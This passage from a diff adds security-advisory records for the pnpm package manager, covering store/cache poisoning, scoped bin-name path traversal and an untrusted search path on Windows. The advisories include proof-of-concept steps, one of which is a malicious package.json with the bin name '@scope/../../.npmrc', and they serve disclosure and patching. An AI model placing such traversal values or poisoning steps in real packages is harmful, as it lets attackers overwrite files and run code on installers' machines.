\"npm:ponyhooves@1\" } },\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm i --ignore-scripts` (the flag is not required, but the point of the demo is to show that it doesn't help)\n4. Create `B/package.json`:\n   ```json\n   {\n     \"name\": \"B\",\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm i`\n\nResult:\n```console\nPackages: +3\n+++\nProgress: resolved 3, reused 3, downloaded 0, added 3, done\nnode_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall script, done in 51ms\n\ndependencies:\n+ rimraf 6.0.1\n\nDone in 1.4s\n```\n\nAlso, that code got leaked into another project and it's lockfile now! \n\n### Impact\n\nGlobal state integrity is lost via operations that one would expect to be secure, enabling subsequently running arbitrary code execution on installs\n\nAs a work-around, use separate cache and store dirs in each workspace\n",
+      "published": "2024-12-10T22:42:41Z",
+      "modified": "2026-02-04T02:48:06.622790Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:H/SI:H/SA:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:H/SI:H/SA:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-53866"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-vm32-9rqf-rh3r",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "9.15.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4"
+      ]
+    },
+    {
+      "id": "GHSA-xpqm-wm3m-f34h",
+      "primary_id": "CVE-2026-23890",
+      "aliases": [
+        "CVE-2026-23890"
+      ],
+      "cve_ids": [
+        "CVE-2026-23890"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "pnpm scoped bin name Path Traversal allows arbitrary file creation outside node_modules/.bin",
+      "details": "### Summary\nA path traversal vulnerability in pnpm's bin linking allows malicious npm packages to create executable shims or symlinks outside of `node_modules/.bin`. Bin names starting with `@` bypass validation, and after scope normalization, path traversal sequences like `../../` remain intact.\n\n### Details\nThe vulnerability exists in the bin name validation and normalization logic:\n\n**1. Validation Bypass (`pkg-manager/package-bins/src/index.ts`)**\n\nThe filter allows any bin name starting with `@` to pass through without validation:\n\n```typescript\n.filter((commandName) =>\n  encodeURIComponent(commandName) === commandName ||\n  commandName === '' ||\n  commandName[0] === '@'  // <-- Bypasses validation\n)\n```\n\n**2. Incomplete Normalization (`pkg-manager/package-bins/src/index.ts`)**\n\n```typescript\nfunction normalizeBinName (name: string): string {\n  return name[0] === '@' ? name.slice(name.indexOf('/') + 1) : name\n}\n// Input:  @scope/../../evil\n// Output: ../../evil  <-- Path traversal preserved!\n```\n\n**3. Exploitation (`pkg-manager/link-bins/src/index.ts:288`)**\n\nThe normalized name is used directly in `path.join()` without validation.\n\n### PoC\n1. Create a malicious package:\n```json\n{\n  \"name\": \"malicious-pkg\",\n  \"version\": \"1.0.0\",\n  \"bin\": {\n    \"@scope/../../.npmrc\": \"./malicious.js\"\n  }\n}\n```\n\n2. Install the package:\n```bash\npnpm add /path/to/malicious-pkg\n```\n\n3. Observe `.npmrc` created in project root (outside node_modules/.bin).\n\n### Impact\n- All pnpm users who install npm packages\n- CI/CD pipelines using pnpm\n- Can overwrite config files, scripts, or other sensitive files\n\nVerified on pnpm main @ commit 5a0ed1d45.",
+      "published": "2026-01-26T21:02:39Z",
+      "modified": "2026-02-03T03:06:15.209571Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-xpqm-wm3m-f34h"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23890"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/8afbb1598445d37985d91fda18abb4795ae5062d"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v10.28.1"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-xpqm-wm3m-f34h",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "10.28.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": [
+        "7.17.0",
+        "7.17.1",
+        "7.18.0",
+        "7.18.1",
+        "7.18.2",
+        "7.19.0",
+        "7.20.0",
+        "7.21.0",
+        "7.22.0",
+        "7.23.0",
+        "7.24.3",
+        "7.25.0",
+        "7.25.1",
+        "7.26.0",
+        "7.26.1",
+        "7.26.2",
+        "7.26.3",
+        "7.27.0",
+        "7.27.1",
+        "7.28.0",
+        "8.4.0",
+        "8.6.1",
+        "8.6.2",
+        "8.6.3",
+        "8.6.4",
+        "8.6.5",
+        "8.6.6",
+        "8.6.7",
+        "8.6.8",
+        "8.6.9",
+        "8.6.10",
+        "8.6.11",
+        "8.6.12",
+        "8.7.0",
+        "8.7.1",
+        "8.7.3",
+        "8.7.4",
+        "8.7.5",
+        "8.7.6",
+        "8.8.0",
+        "8.9.1",
+        "8.9.2",
+        "8.10.0",
+        "8.10.1",
+        "8.10.2",
+        "8.10.3",
+        "8.10.4",
+        "8.10.5",
+        "8.11.0",
+        "8.12.0",
+        "8.12.1",
+        "8.13.1",
+        "8.14.0",
+        "8.14.1",
+        "8.14.2",
+        "8.14.3",
+        "8.15.0",
+        "8.15.1",
+        "8.15.4",
+        "8.15.5",
+        "8.15.6",
+        "8.15.7",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4",
+        "9.0.5",
+        "9.0.6",
+        "9.1.0",
+        "9.1.1",
+        "9.1.2",
+        "9.1.3",
+        "9.1.4",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0",
+        "9.6.0",
+        "9.7.0",
+        "9.7.1",
+        "9.8.0",
+        "9.9.0",
+        "9.10.0",
+        "9.11.0",
+        "9.12.0",
+        "9.12.1",
+        "9.12.2",
+        "9.13.0",
+        "9.13.1",
+        "9.13.2",
+        "9.14.1",
+        "9.14.2",
+        "9.14.3",
+        "9.14.4",
+        "9.15.0",
+        "9.15.1",
+        "9.15.2",
+        "9.15.3",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "10.2.1",
+        "10.3.0",
+        "10.4.0",
+        "10.4.1",
+        "10.5.0",
+        "10.5.1",
+        "10.5.2",
+        "10.6.0",
+        "10.6.1",
+        "10.6.2",
+        "10.6.3",
+        "10.6.4",
+        "10.6.5",
+        "10.7.0",
+        "10.7.1",
+        "10.8.0",
+        "10.8.1",
+        "10.9.0",
+        "10.10.0",
+        "10.11.0",
+        "10.11.1",
+        "10.12.1",
+        "10.12.2",
+        "10.12.3",
+        "10.12.4",
+        "10.13.1",
+        "10.14.0",
+        "10.15.0",
+        "10.15.1",
+        "10.16.0",
+        "10.16.1",
+        "10.17.0",
+        "10.17.1",
+        "10.18.0",
+        "10.18.1",
+        "10.18.2",
+        "10.18.3",
+        "10.19.0",
+        "10.20.0",
+        "10.21.0",
+        "10.22.0",
+        "10.23.0",
+        "10.24.0",
+        "10.25.0",
+        "10.26.0",
+        "10.26.1",
+        "10.26.2",
+        "10.27.0",
+        "10.28.0"
+      ]
+    },
+    {
+      "id": "GHSA-9m87-6fj3-c5xh",
+      "primary_id": "CVE-2022-26183",
+      "aliases": [
+        "CVE-2022-26183"
+      ],
+      "cve_ids": [
+        "CVE-2022-26183"
+      ],
+      "ecosystem": "npm",
+      "upstream_name": "pnpm",
+      "summary": "Untrusted Search Path in PNPM",
+      "details": "PNPM prior to v6.15.1 was discovered to contain an untrusted search path which causes the application to behave in unexpected ways when users execute PNPM commands in a directory containing malicious content. This vulnerability occurs when the application is ran on Windows OS.",
+      "published": "2022-03-23T00:00:24Z",
+      "modified": "2023-11-08T04:08:53.432649Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-26183"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/commit/04b7f60861ddee8331e50d70e193d1e701abeefb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pnpm/pnpm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pnpm/pnpm/releases/tag/v6.15.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.sonarsource.com/blog/securing-developer-tools-package-managers"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-9m87-6fj3-c5xh",
+      "osv_ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.15.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": null,
+      "affected_conda_versions": []
+    }
+  ]
+}
